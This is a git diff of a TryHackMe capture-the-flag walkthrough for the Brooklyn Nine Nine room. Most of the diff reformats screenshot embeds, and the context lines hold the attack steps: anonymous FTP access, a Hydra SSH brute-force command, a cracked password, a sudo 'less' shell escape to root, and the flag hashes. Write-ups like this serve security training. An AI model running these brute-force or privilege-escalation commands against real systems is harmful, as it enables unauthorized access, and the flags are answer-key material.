@@ -1,6 +1,8 @@
-# Brooklyn-Nine CTF [TryHackMe-Walkthrough](https://tryhackme.com/r/room/brooklynninenine)
+# <div align="center">[Brooklyn-Nine CTF](https://tryhackme.com/r/room/brooklynninenine)</div>
 
-![brooklyn99](https://github.com/user-attachments/assets/f99597c1-133b-4e59-a5b7-5e673ec6c862)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/f99597c1-133b-4e59-a5b7-5e673ec6c862" height="200"></img>
+</div>
 
 ## Task 1. Deploy and get hacking.
 
@@ -57,35 +59,50 @@ Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds
 
 # 2. We Get something Intreasting here "FTP".
 ### Let try to login with default Credentials ```anonymous```:```anonymous```
-![Screenshot from 2024-07-26 17-09-53](https://github.com/user-attachments/assets/987901ef-e57f-4eca-aa0f-a033a5f505f2)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/987901ef-e57f-4eca-aa0f-a033a5f505f2" height=""></img>
+</div>
 
 ### login successfully.
 
-![Screenshot from 2024-07-26 17-23-55](https://github.com/user-attachments/assets/2157b64d-a0c8-4f3c-a9c4-c8d1d03f71f3)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/2157b64d-a0c8-4f3c-a9c4-c8d1d03f71f3" height="400"></img>
+</div>
 
 ### here we got a txt file. I just downloaded to my system using get command
 ## Here is the txt file,
-![Screenshot from 2024-07-26 17-14-40](https://github.com/user-attachments/assets/94a7a2b9-4d44-4417-9ebe-5efcda90ffc0)
+<div>
+<img src="https://github.com/user-attachments/assets/94a7a2b9-4d44-4417-9ebe-5efcda90ffc0" height=""></img>
+</div>
 
 ### We got 2 username: Amy, Jake , holt and ```Jake``` is our username for ssh as we read note we understand that jake ssh password is weak.
 # 3. Let Brute-force SSH using Hydra.
 ```
 hydra -l jake -P /home/death/wordlists/rockyou.txt 10.10.112.152 ssh -t 50
 ```
-
-![Screenshot from 2024-07-26 17-28-57](https://github.com/user-attachments/assets/84d20c5b-0cfa-450d-a0d3-73cc5d77c362)
+<div>
+<img src="https://github.com/user-attachments/assets/84d20c5b-0cfa-450d-a0d3-73cc5d77c362" height=""></img>
+</div>
 
 ### login: ```jake```   password: ```987654321```
 ## Logged In as Jake successfully.
 ### I didn't find anything good in jake directory.
-![Screenshot from 2024-07-26 17-33-30](https://github.com/user-attachments/assets/7fe2359b-1090-4afb-99e8-e72ce5c8a6c3)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/7fe2359b-1090-4afb-99e8-e72ce5c8a6c3" height=""></img>
+</div>
 
 ## Let check for /home,
-![Screenshot from 2024-07-26 17-35-01](https://github.com/user-attachments/assets/352aee94-8ae1-424b-af60-e6522a9d08db)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/352aee94-8ae1-424b-af60-e6522a9d08db" height=""></img>
+</div>
 
 ### Here are 3 user, Let check hold directory.
 
-![Screenshot from 2024-07-26 17-35-40](https://github.com/user-attachments/assets/a2482abb-5dcc-45f7-b988-cbcf1c951bbc)
+<div align="center">
+<img src="https://github.com/user-attachments/assets/a2482abb-5dcc-45f7-b988-cbcf1c951bbc" height=""></img>
+</div>
 
 ## Here is the User-Flag.txt
 ```
@@ -96,29 +113,47 @@ ee11cbb19052e40b07aac0ca060c23ee
 ```
 sudo -l
 ```
-![Screenshot from 2024-07-26 17-38-49](https://github.com/user-attachments/assets/5b1e2262-b361-4360-8198-b070fbc67fb1)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/5b1e2262-b361-4360-8198-b070fbc67fb1" height=""></img>
+</div>
 
 ## Ok we can run less command as root,Let visit gtfobin
 ### search for less.
-![Screenshot from 2024-07-26 17-41-55](https://github.com/user-attachments/assets/6acaf07a-a153-47b0-b964-c43ab13726a1)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/6acaf07a-a153-47b0-b964-c43ab13726a1" height="400"></img>
+</div>
+
 
 ### Here is for sudo:
-![Screenshot from 2024-07-26 17-42-51](https://github.com/user-attachments/assets/e8fcbf20-d206-42b6-9e49-6c4ac7b77d35)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/e8fcbf20-d206-42b6-9e49-6c4ac7b77d35" height="400"></img>
+</div>
 
 ```
 sudo less /etc/profile
 !/bin/sh
 ```
 ## Let Run in terminal
-![Screenshot from 2024-07-26 17-45-17](https://github.com/user-attachments/assets/ecb057f8-16b9-4381-8648-fa88ffc973b3)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/ecb057f8-16b9-4381-8648-fa88ffc973b3" height="400"></img>
+</div>
 
 ## Press Enter on keyboard
-![Screenshot from 2024-07-26 17-46-11](https://github.com/user-attachments/assets/c12d0bc6-3f5a-4b36-ae4b-1d33f93fd8c9)
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/c12d0bc6-3f5a-4b36-ae4b-1d33f93fd8c9" height=""></img>
+</div>
 
 ## We got root
 ### Let find root flag at /root
-![Screenshot from 2024-07-26 17-46-45](https://github.com/user-attachments/assets/50ed14b8-5273-4378-8ebe-944f526db71e)
 
+<div align="center">
+<img src="https://github.com/user-attachments/assets/50ed14b8-5273-4378-8ebe-944f526db71e" height=""></img>
+</div>
 
 ```
 63a9f0ea7bb98050796b649e85481845
